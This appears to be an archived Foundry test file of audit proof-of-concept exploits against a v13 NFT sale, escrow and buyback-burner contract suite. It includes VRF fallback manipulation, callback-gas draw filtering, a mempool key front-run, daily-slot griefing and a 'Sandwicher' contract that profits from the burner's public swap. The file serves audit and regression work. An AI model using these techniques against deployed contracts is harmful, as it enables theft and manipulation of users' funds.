@@ -1,0 +1,381 @@
+// ARCHIVED (2026-10-17): the v13 contract audit's proof-of-concept tests, kept as a record. Every finding here was fixed
+// and each scenario now has a regression test that asserts the fix: F1 and F2 in test/NothingStuck.t.sol (a started
+// fallback draw stands and finishes from the EIP-2935 history; it counts from the purchase), F3 (the 24-hour seller
+// window), F4 (callback gas only goes up once the sale opens), I3 (65-byte keys only) and F5 (full public burner
+// steps, test/Burner.t.sol). Not compiled: it asserts the old behaviour.
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.26;
+
+import {Fixture} from "../Fixture.sol";
+import {ArtifactsFactory} from "../../src/ArtifactsFactory.sol";
+import {ArtifactsPiece} from "../../src/ArtifactsPiece.sol";
+import {KeyProof} from "../../src/KeyProof.sol";
+import {ImdBuybackBurner, PoolKey, SwapParams, IUnlockCallback} from "../../src/ImdBuybackBurner.sol";
+import {BrokerPass} from "../../src/BrokerPass.sol";
+import {SubmissionReviews} from "../../src/SubmissionReviews.sol";
+import {IVRFCoordinatorV2Plus} from "../../src/interfaces/Interfaces.sol";
+import {MockSeats} from "../mocks/MockSeats.sol";
+import {MockIMD} from "../mocks/Mocks.sol";
+
+/// @dev Audit PoCs for v13. Not part of the launch suite.
+
+/// Like VRF v2.5: calls back with exactly the request's callbackGasLimit and drops the commitment either way.
+contract GasLimitedVRF {
+    uint256 public nextId = 1;
+    mapping(uint256 => address) public consumer;
+    mapping(uint256 => uint32) public gasOf;
+    mapping(uint256 => bytes32) public s_requestCommitments;
+    bool public lastOk;
+
+    function requestRandomWords(IVRFCoordinatorV2Plus.RandomWordsRequest calldata req) external returns (uint256 id) {
+        id = nextId++;
+        consumer[id] = msg.sender;
+        gasOf[id] = req.callbackGasLimit;
+        s_requestCommitments[id] = keccak256(abi.encode(id));
+    }
+
+    function fulfillWithGas(uint256 id, uint256 word, uint256 gas) public {
+        delete s_requestCommitments[id];
+        uint256[] memory words = new uint256[](1);
+        words[0] = word;
+        (lastOk,) = consumer[id].call{gas: gas}(
+            abi.encodeWithSignature("rawFulfillRandomWords(uint256,uint256[])", id, words)
+        );
+    }
+
+    function fulfill(uint256 id, uint256 word) external {
+        fulfillWithGas(id, word, gasOf[id]);
+    }
+}
+
+contract AuditDraws is Fixture {
+    function _stuckPurchase() internal returns (uint256 id) {
+        _publishAll();
+        _openSale(1 ether);
+        vm.prank(alice);
+        id = factory.buy{value: 1 ether}(address(0)); // Chainlink never answers it
+    }
+
+    /// F1a: the buyer sees the fallback's outcome as soon as block `target` exists, and throws it away with
+    /// rerequestRandomness (allowed: VRF_RETRY_BLOCKS long past and the request still held).
+    function test_F1_buyerSeesFallbackOutcomeThenDiscardsIt() public {
+        uint256 id = _stuckPurchase();
+        vm.roll(vm.getBlockNumber() + factory.FALLBACK_BLOCKS());
+        factory.startFallbackDraw(id);
+        uint256 target = factory.fallbackBlock(id);
+        vm.roll(target + 1);
+        bytes32 h = keccak256("block target's hash");
+        vm.setBlockhash(target, h);
+        uint256 wouldGet = uint256(keccak256(abi.encode(h, id))) % 255 + 1;
+
+        vm.prank(alice); // the curator can do exactly the same (owner may rerequest)
+        uint256 fresh = factory.rerequestRandomness(id);
+        vm.expectRevert(ArtifactsFactory.UnknownRequest.selector);
+        factory.finishFallbackDraw(id);
+
+        vrf.fulfill(fresh, wouldGet); // any other draw
+        assertTrue(factory.requestEdition(fresh) != wouldGet, "the known fallback outcome was discarded");
+        assertEq(factory.editionsOf(alice).length, 1);
+    }
+
+    /// F1b: the same by inaction: nobody else cares to finish, the 256-block window lapses, a new target is drawn.
+    function test_F1_buyerLetsAnUnwantedFallbackLapseAndRedraws() public {
+        uint256 id = _stuckPurchase();
+        vm.roll(vm.getBlockNumber() + factory.FALLBACK_BLOCKS());
+        factory.startFallbackDraw(id);
+        uint256 t1 = factory.fallbackBlock(id);
+        vm.roll(t1 + 1);
+        bytes32 h1 = keccak256("first");
+        vm.setBlockhash(t1, h1);
+        uint256 first = uint256(keccak256(abi.encode(h1, id))) % 255 + 1;
+
+        vm.roll(t1 + 256 + factory.FALLBACK_RETRY_BLOCKS() + 1);
+        vm.setBlockhash(t1, bytes32(0));
+        factory.startFallbackDraw(id);
+        uint256 t2 = factory.fallbackBlock(id);
+        vm.roll(t2 + 1);
+        bytes32 h2 = keccak256("second");
+        vm.setBlockhash(t2, h2);
+        vm.prank(alice);
+        factory.finishFallbackDraw(id);
+        assertTrue(factory.requestEdition(id) != first, "a second, different draw for the same purchase");
+    }
+
+    /// F2: the curator keeps a paid draw from ever reaching the fallback by re-requesting every VRF_RETRY_BLOCKS
+    /// (each re-request restarts the FALLBACK_BLOCKS clock) while the subscription stays unfunded.
+    function test_F2_curatorResetsTheFallbackClockForever() public {
+        uint256 id = _stuckPurchase();
+        uint256 start = vm.getBlockNumber();
+        for (uint256 i; i < 10; ++i) {
+            vm.roll(vm.getBlockNumber() + factory.VRF_RETRY_BLOCKS());
+            vm.prank(curator);
+            id = factory.rerequestRandomness(id);
+            vm.prank(alice);
+            vm.expectRevert(ArtifactsFactory.RequestTooRecent.selector);
+            factory.startFallbackDraw(id);
+        }
+        assertGt(vm.getBlockNumber() - start, 3 * factory.FALLBACK_BLOCKS(), "over 9 days, never drawable");
+        assertEq(factory.editionsOf(alice).length, 0);
+        assertEq(factory.sold(), 1);
+    }
+
+    function _minGas(GasLimitedVRF g, uint256 id, uint256 word) internal returns (uint256 lo) {
+        lo = 30_000;
+        uint256 hi = 2_000_000;
+        while (lo < hi) {
+            uint256 mid = (lo + hi) / 2;
+            uint256 s = vm.snapshotState();
+            g.fulfillWithGas(id, word, mid);
+            bool ok = g.lastOk();
+            vm.revertToState(s);
+            if (ok) hi = mid;
+            else lo = mid + 1;
+        }
+    }
+
+    /// F4: the callback's gas depends on the word (a fresh _pool slot costs a zero-to-nonzero SSTORE, a used one does
+    /// not). With the request's limit between the two, every draw landing on a fresh slot fails, and the failed draw
+    /// may be re-requested at once, so only words the limit lets through are ever assigned. The limit is the curator's
+    /// vrfCallbackGas; under Cancun pricing the band sits just under its 150k floor, under repriced storage (README:
+    /// ~670k per assignment on Sepolia) it sits inside [150k, 2.5M].
+    function test_F4_callbackGasFiltersDrawsByWord() public {
+        GasLimitedVRF g = new GasLimitedVRF();
+        vm.prank(curator);
+        factory.configureVRF(address(g), KEY_HASH, SUB_ID, false);
+        _publishAll();
+        _openSale(1 ether);
+        vm.prank(alice);
+        uint256 a = factory.buy{value: 1 ether}(address(0));
+        g.fulfill(a, 7); // an honest draw at the default 1M: slot 7 now holds edition 255
+        assertEq(factory.requestEdition(a), 8);
+
+        vm.prank(bob);
+        uint256 b = factory.buy{value: 1 ether}(address(0));
+        uint256 gUsed = _minGas(g, b, 7); // 7 % 254: the used slot
+        uint256 gFresh = _minGas(g, b, 100); // a fresh slot
+        emit log_named_uint("callback gas, word on a used slot", gUsed);
+        emit log_named_uint("callback gas, word on a fresh slot", gFresh);
+        emit log_named_uint("VRF_CALLBACK_GAS_MIN", factory.VRF_CALLBACK_GAS_MIN());
+        assertGt(gFresh, gUsed);
+
+        uint256 band = (gUsed + gFresh) / 2;
+        g.fulfillWithGas(b, 100, band);
+        assertFalse(g.lastOk(), "a word on a fresh slot runs out of gas");
+        vm.prank(curator);
+        uint256 b2 = factory.rerequestRandomness(b); // at once: the coordinator already answered
+        g.fulfillWithGas(b2, 7, band);
+        assertTrue(g.lastOk(), "a word on a used slot goes through");
+        assertEq(factory.requestEdition(b2), 255);
+    }
+}
+
+contract AuditEscrow is Fixture {
+    function _listedAndBought() internal returns (ArtifactsPiece piece) {
+        _publishAll();
+        _openSale(1 ether);
+        piece = _claim(alice, _buyAndAssign(alice, address(0), 5));
+        vm.prank(alice);
+        piece.list(1 ether);
+        vm.prank(bob);
+        piece.buy{value: 1 ether}(_vk("bob, for this piece"), address(0));
+    }
+
+    /// F3: alice's postEscrowKey(wrapped) sits in the public mempool; bob unwraps K from its calldata and lands
+    /// cancel() first. Alice's transaction reverts, bob gets every wei back and keeps K. The listing is still up.
+    function test_F3_buyerTakesTheKeyFromTheMempoolAndCancels() public {
+        ArtifactsPiece piece = _listedAndBought();
+        bytes memory wrapped = abi.encodePacked(hex"02", bytes32(uint256(0x1234)), bytes32("K xor pad")); // alice's tx data
+        vm.prank(bob);
+        piece.cancel();
+        vm.prank(alice);
+        vm.expectRevert(ArtifactsPiece.NoEscrowBuyer.selector);
+        piece.postEscrowKey{value: 0.1 ether}(wrapped);
+        uint256 before = bob.balance;
+        vm.prank(bob);
+        piece.withdraw();
+        assertEq(bob.balance - before, 1 ether, "K cost bob nothing but gas");
+        assertEq(piece.ownerOf(1), alice);
+        (uint256 price, address seller, address buyer,,,,,,,) = piece.escrow();
+        assertEq(price, 1 ether);
+        assertEq(seller, alice);
+        assertEq(buyer, address(0), "still listed: repeatable on every listing");
+    }
+
+    /// Info: postEscrowKey takes a key of any length. A ~40 KB key costs release() more than a block; the buyer's
+    /// proof (malformed: no proof needed) still fits. Run with --isolate for realistic numbers.
+    function test_I_hugeEscrowKey_releaseVsProof() public {
+        ArtifactsPiece piece = _listedAndBought();
+        bytes memory huge = new bytes(40_000);
+        for (uint256 i; i < huge.length; ++i) huge[i] = 0xff;
+        vm.prank(alice);
+        piece.postEscrowKey{value: 0.1 ether}(huge);
+        uint256 s = vm.snapshotState();
+        uint256 g = gasleft();
+        vm.prank(bob);
+        piece.release();
+        emit log_named_uint("release() gas with a 40 KB key", g - gasleft());
+        vm.revertToState(s);
+        KeyProof.Proof memory p;
+        g = gasleft();
+        vm.prank(bob);
+        piece.proveFakeKey(p);
+        emit log_named_uint("proveFakeKey() gas with a 40 KB key", g - gasleft());
+        assertEq(piece.pendingWithdrawals(bob), 1.1 ether);
+    }
+
+    /// Info: README says a broker earns only if it is not the buyer; the ledger pays a buyer who names itself.
+    function test_I_brokerBuyingForItselfTakesTheBrokerShare() public {
+        _publishAll();
+        _openSale(1 ether);
+        vm.deal(broker, 10 ether);
+        vm.prank(broker);
+        factory.buy{value: 1 ether}(broker);
+        assertEq(house.balances(broker, address(0)), 0.15 ether);
+    }
+
+    /// Info: one transferable Broker Pass counts as any number of thesis authors.
+    function test_I_onePassManyThesisAuthors() public {
+        MockSeats seats = new MockSeats();
+        BrokerPass pass = new BrokerPass(address(seats), address(factory), address(source));
+        SubmissionReviews reviews =
+            new SubmissionReviews(address(house), address(seats), address(factory), address(source));
+        vm.startPrank(curator);
+        house.setBrokerPass(address(pass));
+        pass.setClaimsOpenAt(uint64(block.timestamp));
+        vm.stopPrank();
+        house.submit(keccak256("a drop"), "ipfs://x");
+        address holder = makeAddr("agent");
+        seats.mint(holder, 1);
+        vm.prank(holder);
+        pass.claimWithSeat(1);
+        for (uint256 i; i < 5; ++i) {
+            vm.prank(holder);
+            reviews.postThesis(0, "the case for it");
+            address next = makeAddr(string(abi.encodePacked("sock", i)));
+            vm.prank(holder);
+            pass.transferFrom(holder, next, 1);
+            holder = next;
+        }
+        assertEq(reviews.thesisAuthors(0), 5);
+        assertEq(pass.totalSupply(), 1);
+    }
+}
+
+/// Constant-product stand-in for the v4 pool (1% fee kept in the pool), with direct swaps for the attacker.
+contract CPPoolManager {
+    MockIMD public imd;
+    uint256 public ethR;
+    uint256 public imdR;
+    int256 internal owedEth;
+    int256 internal owedImd;
+
+    constructor(MockIMD imd_) {
+        imd = imd_;
+    }
+
+    function seed(uint256 imdAmount) external payable {
+        ethR = msg.value;
+        imdR = imdAmount;
+    }
+
+    function _outFor(uint256 inAmt, uint256 rIn, uint256 rOut) internal pure returns (uint256) {
+        uint256 net = inAmt * 99 / 100;
+        return rOut * net / (rIn + net);
+    }
+
+    function buyImd() external payable returns (uint256 out) {
+        out = _outFor(msg.value, ethR, imdR);
+        ethR += msg.value;
+        imdR -= out;
+        imd.transfer(msg.sender, out);
+    }
+
+    function sellImd(uint256 amount) external returns (uint256 out) {
+        imd.transferFrom(msg.sender, address(this), amount);
+        out = _outFor(amount, imdR, ethR);
+        imdR += amount;
+        ethR -= out;
+        payable(msg.sender).transfer(out);
+    }
+
+    function unlock(bytes calldata data) external returns (bytes memory r) {
+        r = IUnlockCallback(msg.sender).unlockCallback(data);
+        require(owedEth == 0 && owedImd == 0, "unsettled");
+    }
+
+    function swap(PoolKey memory, SwapParams memory p, bytes calldata) external returns (int256) {
+        uint256 amountIn = uint256(-p.amountSpecified);
+        uint256 out = _outFor(amountIn, ethR, imdR);
+        ethR += amountIn;
+        imdR -= out;
+        owedEth += int256(amountIn);
+        owedImd += int256(out);
+        return (int256(-int128(int256(amountIn))) << 128) | int256(uint256(uint128(int128(int256(out)))));
+    }
+
+    function settle() external payable returns (uint256) {
+        owedEth -= int256(msg.value);
+        return msg.value;
+    }
+
+    function take(address, address to, uint256 amount) external {
+        owedImd -= int256(amount);
+        imd.transfer(to, amount);
+    }
+}
+
+contract Sandwicher {
+    function run(CPPoolManager pm, ImdBuybackBurner burner, MockIMD imd, uint256 push) external payable {
+        pm.buyImd{value: push}();
+        burner.burnEth(0.05 ether, 1, block.timestamp); // the public path: the caller sets the minimum
+        uint256 bal = imd.balanceOf(address(this));
+        imd.approve(address(pm), bal);
+        pm.sellImd(bal);
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
+
+contract AuditBurner is Fixture {
+    /// F5a: after IDLE, a 1-wei public swap takes the day's only public slot (repeatable daily).
+    function test_F5_dustSwapTakesTheDailyPublicSlot() public {
+        CPPoolManager pm = new CPPoolManager(imd);
+        imd.mint(address(pm), 1_000_000 ether);
+        pm.seed{value: 1 ether}(1_000_000 ether);
+        ImdBuybackBurner burner = new ImdBuybackBurner(address(house), address(pm), address(imd), 10_000, 200, address(0));
+        vm.deal(address(burner), 10 ether);
+        uint256 t = block.timestamp + burner.IDLE(); // via-IR caches block.timestamp: keep time locally
+        vm.warp(t);
+        address griefer = makeAddr("griefer");
+        for (uint256 d; d < 5; ++d) {
+            vm.prank(griefer);
+            burner.burnEth(1 gwei, 1, type(uint256).max);
+            vm.prank(carol);
+            vm.expectRevert(ImdBuybackBurner.TooSoon.selector);
+            burner.burnEth(0.05 ether, 1, type(uint256).max);
+            t += 1 days;
+            vm.warp(t);
+        }
+        assertEq(address(burner).balance, 10 ether - 5 gwei);
+    }
+
+    /// F5b: the public caller picks minImdOut, so it can sandwich its own call atomically. 1 ETH of in-range depth.
+    function test_F5_publicCallerSandwichesItsOwnSwap() public {
+        CPPoolManager pm = new CPPoolManager(imd);
+        imd.mint(address(pm), 1_000_000 ether);
+        pm.seed{value: 1 ether}(1_000_000 ether);
+        ImdBuybackBurner burner = new ImdBuybackBurner(address(house), address(pm), address(imd), 10_000, 200, address(0));
+        vm.deal(address(burner), 10 ether);
+        vm.warp(block.timestamp + burner.IDLE());
+        Sandwicher s = new Sandwicher();
+        address mev = makeAddr("mev");
+        vm.deal(mev, 10 ether);
+        uint256 before = mev.balance;
+        vm.prank(mev);
+        s.run{value: 4 ether}(pm, burner, imd, 4 ether);
+        emit log_named_uint("attacker profit (wei) from one 0.05 ETH public swap", mev.balance - before);
+        assertGt(mev.balance, before + 0.02 ether);
+    }
+}
